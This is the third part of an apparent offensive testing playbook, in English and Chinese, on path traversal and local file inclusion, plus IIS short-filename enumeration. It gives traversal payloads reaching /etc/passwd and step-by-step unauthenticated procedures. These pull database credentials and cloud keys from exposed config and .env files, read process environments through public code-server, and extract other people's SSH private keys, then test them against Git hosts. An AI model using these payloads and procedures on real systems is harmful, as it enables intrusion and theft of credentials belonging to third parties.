# path-traversal-lfi-test · part 3

> 分段 3/3。完整索引见 `path-traversal-lfi-test.md`。

## 23. NODE.JS PATH MODULE QUIRKS

### `path.join()` with URL-encoded input

```javascript
const path = require('path');

app.get('/files/:name', (req, res) => {
    const filePath = path.join(__dirname, 'uploads', req.params.name);
    res.sendFile(filePath);
});
```

Express URL-decodes `req.params` before `path.join`:

```text
GET /files/..%2f..%2f..%2fetc%2fpasswd
req.params.name = "../../../etc/passwd" (already decoded)
path.join(__dirname, 'uploads', '../../../etc/passwd') = /etc/passwd
```

### `express.static()` quirks

- Calls `decodeURIComponent` on the path, then `path.normalize()`
- Double encoding (`%252e%252e%252f`) bypasses if middleware decodes once, then `express.static` decodes again
- Null bytes (`%00`) rejected in modern Node.js (v14+), but legacy versions may truncate

### `url.parse()` vs `new URL()` confusion

```javascript
// Legacy: url.parse() does NOT resolve path traversal
const parsed = require('url').parse(userInput);
// parsed.pathname may contain ../

// Modern: new URL() normalizes the path
const parsed = new URL(userInput, 'http://localhost');
// parsed.pathname has ../ resolved
```

Apps mixing `url.parse()` and `path.join()` may allow traversal that `new URL()` would have normalized.

### 仓库根当静态（koa-static / express.static 指到 cwd）

认：页面或 `/package.json` 能直接 GET 到 Node 工程文件（`package.json`、`routes/`、`index.js`），说明静态中间件指的是仓库根，不是 `public/`。

打：不登录。顺着 node-config 环境名打 `/config/online.yml` `/config/default.yml` `/config/production.yml` `/config/pre.yml` `/config/dev.yml`，以及 `.env`。不必先打 `../`。

算成：yml/json 里是**完整库账密或云密钥实值**。只有 README / 无钥源码 / 只有端口的空模板 → 没成（信息级不报）。

假点：静态根只出 `public`；`package.json` 200 但 config 404；yml 没有账密。单站没中不删这套认法。

### 静态桶上的 .NET 发布物（aspx 还能 GET）

认：对象存储 / 静态桶（MSS `product-fe-*` 一类）上挂着旧 .NET 发布物。aspx 源码还能 GET，不是编译后才吐。同目录 `web.config` 常被 WAF 拦。不是 Node 仓库根（那枪见上一节）。

打：不登录。`web.config` 456 别停，打同目录 `App.config`、`Web.Release.config`、`*.exe.config`、`bin/*.dll.config`。有 bin 再扫 `*.pdb` 看有没有连配置。

算成：完整账密或 DeveloperToken，不是 `ENTER_YOUR_*` 占位。

假点：aspx 200 但 config 404；只有源码没有钥；占位符口令。密钥实值不进库。单站没中不删这套认法。

### 公网 VS Code 系读进程环境

认：公网 code-server；打开 `/login` 直接进编辑器（无登录墙）。

打：不登录 `GET /remote-resource?path=/proc/self/status` 看 Uid，再 `path=/proc/self/environ`。公网 VS Code 系、页面/`_static` 里 `AuthType.None` 是常见皮，没有这个字仍打。不要停在 README。environ 里若有 SSH 私钥（常是 Base64 PEM）：**解开后假钥对照** 连环境里的 Git 主机，真钥 Hello 用户名、假钥 Permission denied。只抄到字符串不算认钥。

算成：environ 里是**他人**邮箱和完整 SSH 私钥，且真钥能问出 Git 用户名。只有安装脚本 / 公开模板 → 没成。

假点：path 要登录；只读到 README；真假钥同一句 Permission denied。认证枚举名不是 None 不算假点。单站没中不删战法索引这行。密钥实值不进库。

---
## 24. IIS SHORT FILENAME ENUMERATION (~1 TILDE TRICK)

### Concept

Windows NTFS generates 8.3 short filenames (e.g., `LONGFI~1.TXT`). IIS responds differently for valid vs invalid short name prefixes.

### Detection method

```text
GET /W~1.ASP HTTP/1.1  -> 404 (name pattern valid)
GET /Z~1.ASP HTTP/1.1  -> 400 (bad request)
```

Differential response leaks whether a file starting with that prefix exists.

### Enumeration process

```text
Step 1: /A~1* -> 404 = file starting with A exists
Step 2: /AB~1* -> 404 = file starting with AB exists
Step 3: /ABCDEF~1.A* -> 404 = extension starts with A
```

### Tools

```bash
java -jar iis_shortname_scanner.jar https://target.com/
```

### Impact

- Discover hidden backups, config files, source code
- Shorter brute-force space: 8.3 format limits character set
- Works even when directory listing is disabled
